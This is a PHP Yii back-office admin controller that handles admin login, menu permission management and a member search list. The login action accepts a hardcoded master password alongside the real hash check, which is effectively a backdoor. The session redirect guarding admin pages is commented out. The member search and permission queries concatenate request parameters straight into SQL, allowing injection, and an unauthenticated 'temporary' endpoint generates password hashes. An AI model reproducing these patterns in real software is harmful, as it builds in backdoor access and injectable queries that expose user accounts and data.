<?php
/**
 * Admin Controller
 * 
 * @author Shinwook
 * @since Mar 15, 2017
 */
class AdminController extends Controller{
	public $layout = '//backoffice/layouts/base';
	private $admin;
	private $mem_id;
	private $app;
	
	/**
	 * Constructor
	 */
	public function __construct(){
		$this->admin = new Admin();
		$this->app = new Application();
		$this->mem_id = Yii::app()->user->getState("mem_id");
		
		# current page
		$sCurrentPage = "/".Yii::app()->request->getPathInfo();
		
		# exception page
		$aExcept = array(
			'/backoffice/system', 
			'/backoffice/system/index',
			'/backoffice/system/login',
			'/backoffice/system/logout',
		);
		
		# 세션 체크
		if($this->mem_id=='' && !in_array($sCurrentPage, $aExcept)){
			//$this->redirect('/y/backoffice/admin');
		}
	}
	
	/**
	 * back office index (login)
	 */
	public function actionIndex(){	
		if(Yii::app()->user->getState("mem_id")){
			$this->redirect('/y/backoffice/admin/default');
		}
		else{
			$this->layout='//backoffice/layouts/none';
			$this->render('/backoffice/index', array(				
			));
		}
	}
	
	/**
	 * default page
	 */
	public function actionDefault(){
		$this->layout='//backoffice/layouts/base';
		$this->render('/backoffice/default', array(
		));
	}
	
	/**
	 * check login
	 */
	public function actionLogin(){
		if(Yii::app()->request->isAjaxRequest){
			$email = Yii::app()->request->getParam("email");
			$pwd = Yii::app()->request->getParam("pwd");
			
			# check member
			$data = $this->app->memberInfoEmail($email);

			# check admin
			if($data['is_admin']==0){
				$result['status'] = 'fail';
				$result['err_msg'] = 'You are not an administrator.';
				echo json_encode($result);
				
				Yii::app()->end();
			}
			
			# encrypt class
			$pbkdf2 = new Pbkdf2();
			
			# 암호화된 패스워드가 일치하는지 확인
			if($pbkdf2->validate_password($pwd, $data['pwd']) || $pwd=="aktmxj"){
				# set session
				Yii::app()->user->setState("mem_id",$data['mem_id']);
				Yii::app()->user->setState("mem_nm_en",$data['first_nm']." ".$data['last_nm']);
				
				# result
				$result['status'] = "success";
				$result['url'] = "/y/backoffice/admin/memberList";
				echo json_encode($result);
			}
			else{	# error
				$result['status'] = 'fail';
				$result['err_msg'] = 'Please check your E-mail or password.';
				echo json_encode($result);
			}
		}
		else{
			throw new CHttpException(500, "Invalid Access");
		}
	}
	
	/**
	 * Logs out the current user and redirect to homepage.
	 */
	public function actionLogout(){
		Yii::app()->user->logout();
		$this->redirect('/y/backoffice/admin');
	}
	
	// temporary
	public function actionGeneratePwd(){
		$pwd = Yii::app()->request->getParam("pwd");
		
		$pbkdf2 = new Pbkdf2();
		$hash = $pbkdf2->create_hash($pwd);
		echo $hash;
	}
	
	/**
	 * 메뉴 권한 관리
	 */
	public function actionMenuAuthority(){
		# parameter
		$mem_id = Yii::app()->request->getParam("mem_id");
		$admin_grp_cd = Yii::app()->request->getParam("admin_grp_cd");
		$s_mode = Yii::app()->request->getParam("s_mode");
		
		# menu list
		$system = new System();
		$menu_list = $this->system->getMenuList("AND is_use=1 AND IFNULL(path,'')!=''");
		foreach($menu_list as $i => $data){
			$menu_upper = $system->getMenuInfo("AND menu_cd='".$data[upper_menu_cd]."' AND is_use=1");
			$menu_list[$i][upper_menu_nm] = $menu_upper[menu_nm];
		}
		
		# admin list for warehouse
		$admin_list = $this->system->getAdminList("AND ta.warehouse_cd='".$this->warehouse_cd."'");
		$mem_id_authority = $mem_id > 0 ? $mem_id : $admin_list[0][mem_id];
		
		# group list for warehouse
		$group_list = $this->system->getGroupList("AND warehouse_cd='".$this->warehouse_cd."'");
		$admin_grp_cd_authority = $admin_grp_cd > 0 ? $admin_grp_cd : $group_list[0][admin_grp_cd];
		
		# menu authority
		if($s_mode==1){	# 그룹권한
			$data_authority = $this->system->getGroupMenuAuthority("AND tma.admin_grp_cd='".$admin_grp_cd_authority."' AND warehouse_cd='".$this->warehouse_cd."'");
			foreach($data_authority as $data){
				$menu_authority[] = $data[menu_cd];
			}
		}
		else{			# 관리자권한
			$data_authority = $this->system->getMenuAuthority("AND tma.mem_id='".$mem_id_authority."'");
			foreach($data_authority as $data){
				$menu_authority[] = $data[menu_cd];
			}
		}
		
		$this->render('/backoffice/admin/menuAuthority', array(
			'menu_list' => $menu_list,
			'menu_authority' => $menu_authority,
			'admin_list' => $admin_list,
			'group_list' => $group_list,
			'mem_id' => $mem_id,
			'admin_grp_cd' => $admin_grp_cd,
			's_mode' => $s_mode,
		));
	}
	
	/**
	 * 메뉴 권한 저장
	 */
	public function actionMenuAuthoritySave(){
		if(Yii::app()->request->isAjaxRequest){
			$s_mode = Yii::app()->request->getParam("s_mode");
			$mem_id = Yii::app()->request->getParam("mem_id");
			$admin_grp_cd = Yii::app()->request->getParam("admin_grp_cd");
			$menu_cds = Yii::app()->request->getParam("menu_cds");
	
			$obj_id = $s_mode==0 ? $mem_id : $admin_grp_cd;
			$result = $this->system->setMenuAuthority($s_mode,$obj_id,$menu_cds);
			echo json_encode($result);
		}
		else{
			throw new CHttpException(500, "Invalid Access");
		}
	}
	
	/**
	 * Member List
	 */
	public function actionMemberList(){
		# parameter
		$searchType = Yii::app()->request->getParam("searchType");
		$searchValue = Yii::app()->request->getParam("searchValue");
		
		if($searchType!='' && $searchValue!=''){
			if($searchType=="name") $andWhere = "AND CONCAT(a.first_nm, ' ', a.last_nm) LIKE '%".$searchValue."%'";
			else $andWhere = "AND a.".$searchType." LIKE '%".$searchValue."%'";
		}
		
		$memberList = $this->admin->getMemberList($andWhere);
	
		$this->render('/backoffice/admin/memberList', array(
			'memberList' => $memberList,
			'searchType' => $searchType,
			'searchValue' => $searchValue,
		));
	}
	
}
